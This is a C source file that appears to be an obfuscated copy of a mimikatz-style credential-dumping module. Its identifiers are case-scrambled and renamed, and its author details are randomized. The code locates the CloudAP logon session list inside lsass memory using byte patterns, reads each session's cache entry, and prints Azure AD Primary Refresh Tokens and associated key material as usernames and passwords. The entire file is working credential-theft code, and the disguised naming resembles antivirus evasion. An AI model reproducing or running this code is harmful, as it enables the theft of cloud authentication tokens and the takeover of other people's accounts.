/*	HEstebqu SqUtI `PQu4nQbtjF`
	https://blog.PQu4nQbtjF.com
	isMW9TRNNJyHATgICHfOUxr
	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
*/
#include "kuhl_m_seKuRlSa_clOuDAp.h"

#if defined(_M_X64)
BYTE PTRN_WALL_CloudApLocateLogonSession[]	= {0x44, 0x8b, 0x01, 0x44, 0x39, 0x42};//, 0x18, 0x75};
KULL_M_PATCH_GENERIC CloudApReferences[] = {
	{KULL_M_WIN_BUILD_10_1909,	{sizeof(PTRN_WALL_CloudApLocateLogonSession),	PTRN_WALL_CloudApLocateLogonSession},	{0, NULL}, {-9}},
};
#elif defined(_M_IX86)
BYTE PTRN_WALL_CloudApLocateLogonSession[]	= {0x8b, 0x31, 0x39, 0x72, 0x10, 0x75};
KULL_M_PATCH_GENERIC CloudApReferences[] = {
	{KULL_M_WIN_BUILD_10_1909,	{sizeof(PTRN_WALL_CloudApLocateLogonSession),	PTRN_WALL_CloudApLocateLogonSession},	{0, NULL}, {-8}},
};
#endif

PJlzW_CLOUDAP_LOGON_LIST_ENTRY CloudApGlobalLogonSessionList = NULL;

KUHL_M_SEKURLSA_PACKAGE kuhl_m_seKuRlSa_clOuDAp_package = {L"clOuDAp", kuhl_m_seKuRlSa_enum_logon_callback_clOuDAp, FALSE, L"clOuDAp.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
const PKUHL_M_SEKURLSA_PACKAGE kuhl_m_seKuRlSa_clOuDAp_single_package[] = {&kuhl_m_seKuRlSa_clOuDAp_package};

NTSTATUS kuhl_m_seKuRlSa_clOuDAp(int argc, wchar_t * argv[])
{
	return kuhl_m_seKuRlSa_getLogonData(kuhl_m_seKuRlSa_clOuDAp_single_package, 1);
}

void CALLBACK kuhl_m_seKuRlSa_enum_logon_callback_clOuDAp(IN PJlzW_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	
	JlzW_CLOUDAP_CACHE_LIST_ENTRY caCHe;
	JlzW_CLOUDAP_CACHE_UNK unk;
	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, pData->cLsass->hLsassMem};
	JlzW_GENERIC_PRIMARY_CREDENTIAL crEds = {0};

	if(kuhl_m_seKuRlSa_clOuDAp_package.Module.isInit || kuhl_m_seKuRlSa_utils_search_generic(pData->cLsass, &kuhl_m_seKuRlSa_clOuDAp_package.Module, CloudApReferences, ARRAYSIZE(CloudApReferences), (PVOID *) &CloudApGlobalLogonSessionList, NULL, NULL, NULL))
	{
		aLsassMemory.address = CloudApGlobalLogonSessionList;
		if (pData->cLsass->osContext.BuildNumber > KULL_M_WIN_BUILD_10_1909)
		{
			JlzW_CLOUDAP_LOGON_LIST_ENTRY_21H2 logon;
			KULL_M_MEMORY_ADDRESS aLocalMemory = {&logon, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
			if(aLsassMemory.address = kuhl_m_seKuRlSa_utils_pFromLinkedListByLuid(&aLsassMemory, FIELD_OFFSET(JlzW_CLOUDAP_LOGON_LIST_ENTRY_21H2, LocallyUniqueIdentifier), pData->LogonId))
			{
				if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(JlzW_CLOUDAP_LOGON_LIST_ENTRY_21H2)))
				{
					if(logon.caCHeEntry)
					{
						aLocalMemory.address = &caCHe;
						aLsassMemory.address = logon.caCHeEntry;
						if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(JlzW_CLOUDAP_CACHE_LIST_ENTRY)))
						{
							kprintf(L"\n\t     Cachedir : %s", caCHe.toname);
							if(caCHe.cbPRT && caCHe.PRT)
							{
								crEds.UserName.Length = crEds.UserName.MaximumLength = (USHORT) caCHe.cbPRT;
								crEds.UserName.Buffer = (PWSTR) caCHe.PRT;
							}

							if(caCHe.toDetermine)
							{
								aLocalMemory.address = &unk;
								aLsassMemory.address = caCHe.toDetermine;
								if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(JlzW_CLOUDAP_CACHE_UNK)))
								{
									kprintf(L"\n\t     Key GUID : ");
									kull_m_string_displayGUID(&unk.guid);
									crEds.Password.Length = crEds.Password.MaximumLength = (USHORT) unk.unkSize;
									crEds.Password.Buffer = (PWSTR) unk.unk;
								}
							}
							kuhl_m_seKuRlSa_genericCredsOutput(&crEds, pData, KUHL_SEKURLSA_CREDS_DISPLAY_CLOUDAP_PRT);
						}
					}
				}
			}
		}
		else
		{
			JlzW_CLOUDAP_LOGON_LIST_ENTRY logon;
			KULL_M_MEMORY_ADDRESS aLocalMemory = {&logon, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
			if(aLsassMemory.address = kuhl_m_seKuRlSa_utils_pFromLinkedListByLuid(&aLsassMemory, FIELD_OFFSET(JlzW_CLOUDAP_LOGON_LIST_ENTRY, LocallyUniqueIdentifier), pData->LogonId))
			{
				if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(JlzW_CLOUDAP_LOGON_LIST_ENTRY)))
				{
					if(logon.caCHeEntry)
					{
						aLocalMemory.address = &caCHe;
						aLsassMemory.address = logon.caCHeEntry;
						if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(JlzW_CLOUDAP_CACHE_LIST_ENTRY)))
						{
							kprintf(L"\n\t     Cachedir : %s", caCHe.toname);
							if(caCHe.cbPRT && caCHe.PRT)
							{
								crEds.UserName.Length = crEds.UserName.MaximumLength = (USHORT) caCHe.cbPRT;
								crEds.UserName.Buffer = (PWSTR) caCHe.PRT;
							}

							if(caCHe.toDetermine)
							{
								aLocalMemory.address = &unk;
								aLsassMemory.address = caCHe.toDetermine;
								if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(JlzW_CLOUDAP_CACHE_UNK)))
								{
									kprintf(L"\n\t     Key GUID : ");
									kull_m_string_displayGUID(&unk.guid);
									crEds.Password.Length = crEds.Password.MaximumLength = (USHORT) unk.unkSize;
									crEds.Password.Buffer = (PWSTR) unk.unk;
								}
							}
							kuhl_m_seKuRlSa_genericCredsOutput(&crEds, pData, KUHL_SEKURLSA_CREDS_DISPLAY_CLOUDAP_PRT);
						}
					}
				}
			}
		}
	} else kprintf(L"KO");
}